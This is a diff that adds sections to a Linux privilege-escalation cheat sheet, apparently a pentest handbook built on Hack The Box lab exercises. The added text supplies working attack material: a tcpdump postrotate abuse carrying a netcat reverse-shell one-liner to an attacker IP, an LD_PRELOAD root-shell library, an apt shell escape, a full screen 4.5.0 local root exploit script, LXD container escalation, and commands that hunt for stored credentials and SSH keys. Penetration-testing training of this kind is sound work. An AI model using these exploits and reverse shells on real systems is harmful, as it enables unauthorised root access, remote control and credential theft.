@@ -12,6 +12,7 @@ cat /etc/passwd
 
 ```bash
 ps
+ps au
 ps aux
 ps aux | grep root
 ps -A # View all running processes
@@ -176,6 +177,8 @@ Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO\_KILLER)
 
 ### NOPASSWD
 
+#### vim
+
 Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.
 
 ```bash
@@ -191,6 +194,71 @@ In this example the user `demo` can run `vim` as `root`, it is now trivial to ge
 sudo vim -c '!sh'
 sudo -u root vim -c '!sh'
 ```
+
+#### tcpdump
+
+```sh
+htb_student@NIX02:~$ sudo -l
+
+Matching Defaults entries for sysadm on NIX02:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User sysadm may run the following commands on NIX02:
+    (root) NOPASSWD: /usr/sbin/tcpdump
+```
+
+```bash
+htb_student@NIX02:~$ man tcpdump
+
+<SNIP> 
+-z postrorate-command              
+
+Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
+```
+
+By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script `.test` containing a reverse shell and execute it as follows:
+
+```bash
+htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+```
+
+make a file to execute with the `postrotate-command`, adding a simple reverse shell one-liner
+
+```bash
+htb_student@NIX02:~$ cat /tmp/.test
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
+```
+
+Next, start a `netcat` listener on our attacking box run `tcpdump` as root with the `postrotate-command`. If all goes to plan, we will receive a root reverse shell connection.
+
+```bash
+htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+
+dropped privs to root
+tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+6 packets received by filter
+compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
+0 packets dropped by kernel
+```
+
+```bash
+lojique@htb[/htb]$ nc -lnvp 443
+
+listening on [any] 443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
+bash: cannot set terminal process group (10797): Inappropriate ioctl for device
+bash: no job control in this shell
+
+root@NIX02:~# id && hostname               
+id && hostname
+uid=0(root) gid=0(root) groups=0(root)
+NIX02
+```
+
+## Shared Libraries
 
 ### LD\_PRELOAD & **LD\_LIBRARY\_PATH**
 
@@ -220,6 +288,37 @@ Execute any binary with the LD\_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<ful
 #### Example:
 
 {% embed url="https://lojique.gitbook.io/hack-the-box/v/photobomb/privilege-escalation" %}
+
+#### Another Example
+
+```bash
+htb_student@NIX02:~$ sudo -l
+
+Matching Defaults entries for daniel.carter on NIX02:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User daniel.carter may run the following commands on NIX02:
+    (root) NOPASSWD: /usr/sbin/apache2 restart
+```
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+
+```bash
+gcc -fPIC -shared -o root.so root.c -nostartfiles
+
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+```
 
 {% hint style="danger" %}
 A similar privesc can be abused if the attacker controls the **LD\_LIBRARY\_PATH** env variable because he controls the path where libraries are going to be searched.
@@ -313,7 +412,7 @@ If you get an error such as
 ./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
 ```
 
-that means that the library you have generated need to have a function called `a_function_name`.
+that means that the library you have generated needs to have a function called `a_function_name`.
 
 #### CVE-2019-14287
 
@@ -353,6 +452,15 @@ sudo nano
 reset; sh 1>&0 2>&0
 ```
 
+#### apt
+
+```bash
+lojique@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
 ## SUID
 
 SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distribution. If a file with this bit is run, the uid will be changed by the owner one. If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.
@@ -360,9 +468,16 @@ SUID/Setuid stands for "set user ID upon execution", it is enabled by default in
 #### Find SUID binaries
 
 ```bash
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -uid 0 -perm -4000 -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
+```
+
+#### Find SGID binaries
+
+```bash
+find / -uid 0 -perm -6000 -type f 2>/dev/null
 ```
 
 #### wget
@@ -567,6 +682,12 @@ uid=0(root) gid=1000(swissky)
 | CAP\_NET\_RAW           | Use RAW and PACKET sockets                                                                                                                  |
 | CAP\_NET\_BIND\_SERVICE | SERVICE Bind a socket to internet domain privileged ports                                                                                   |
 
+## Writeable Directories
+
+```bash
+find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+```
+
 ## Writable files
 
 List world writable files on the system.
@@ -575,6 +696,7 @@ List world writable files on the system.
 find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
 find / -perm -2 -type f 2>/dev/null
 find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 ```
 
 ### Writable /etc/passwd
@@ -746,6 +868,10 @@ mount /dev/sda1 /mnt/hola
 
 And voilà ! You can now access the filesystem of the host because it is mounted in the `/mnt/hola` folder.
 
+## Disk
+
+Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.
+
 ## Restricted Shell
 
 {% embed url="https://0xffsec.com/handbook/shells/restricted-shells/" %}
@@ -758,6 +884,64 @@ vim
 :shell
 export PATH=/bin:/usr/bin or export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11:/usr/games
 ```
+
+## **Screen Version Identification**
+
+Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.
+
+```
+screen -v
+```
+
+The below script can be used to perform this privilege escalation attack:
+
+{% code title="Screen_Exploit_POC.sh" %}
+```bash
+#!/bin/bash
+# screenroot.sh
+# setuid screen v4.5.0 local root exploit
+# abuses ld.so.preload overwriting to get root.
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
+# HACK THE PLANET
+# ~ infodox (25/1/2017)
+echo "~ gnu/screenroot ~"
+echo "[+] First, we create our shell and library..."
+cat << EOF > /tmp/libhax.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/stat.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat << EOF > /tmp/rootshell.c
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
+rm -f /tmp/rootshell.c
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+echo "[+] Triggering..."
+screen -ls # screen itself is setuid, so...
+/tmp/rootshell
+```
+{% endcode %}
 
 ## Kernel Exploits
 
@@ -835,6 +1019,51 @@ Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
  gcc mempodipper.c -o mempodipper
  ./mempodipper
 ```
+
+## Credential Hunting
+
+```bash
+cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
+find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
+ls ~/.ssh
+```
+
+## Privileged Groups
+
+### LXC/LXD
+
+{% embed url="https://academy.hackthebox.com/module/51/section/477" %}
+
+The privesc requires to run a container with elevated privileges and mount the host filesystem inside.
+
+```bash
+╭─swissky@lab ~  
+╰─$ id
+uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
+```
+
+Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.
+
+```bash
+# build a simple alpine image
+git clone https://github.com/saghul/lxd-alpine-builder
+./build-alpine -a i686
+
+# import the image
+lxc image import ./alpine.tar.gz --alias myimage
+
+# run the image
+lxc init myimage r00t -c security.privileged=true
+
+# mount the /root into the image
+lxc config device add r00t mydevice disk source=/ path=/mnt/root recursive=true
+
+# interact with the container
+lxc start r00t
+lxc exec r00t /bin/sh
+```
+
+Alternatively [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)
 
 ## Automated Resources
 
